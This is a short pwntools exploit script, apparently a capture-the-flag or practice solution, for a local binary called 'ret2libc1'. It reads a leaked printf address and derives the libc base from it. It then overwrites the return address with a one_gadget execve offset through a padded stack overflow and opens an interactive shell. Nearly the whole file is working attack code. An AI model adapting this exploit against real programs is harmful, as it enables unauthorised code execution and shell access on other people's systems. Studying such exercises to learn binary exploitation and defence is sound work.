#!/bin/python3

from pwn import *

p = process('./ret2libc1')
e = ELF('./ret2libc1')

# find local location of libc with `ldd <binary>`
l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 


# 'leaked' printf address in libc
printf_address = int(p.recvuntil('\n').rstrip(), 16)


'''
Now get the libc base address by finding the difference
between the libc printf and our printf
'''

libc_base_address = printf_address - l.sym['printf']

# print(hex(libc_base_address))
# This address should end with 3 0s in its hex representation

one_gadget_libc_execve_out = [0xcad1a, 0xcad1d, 0xcad20] # use any of these until it works

libc_execve_address = libc_base_address + one_gadget_libc_execve_out[1]

 # instruction pointer  - stack entry
offset = 0x7ffd71ffc0d8 - 0x7ffd71ffc0c1

payload = b"A"*offset
payload += p64(libc_execve_address)

p.sendline(payload)

p.interactive()



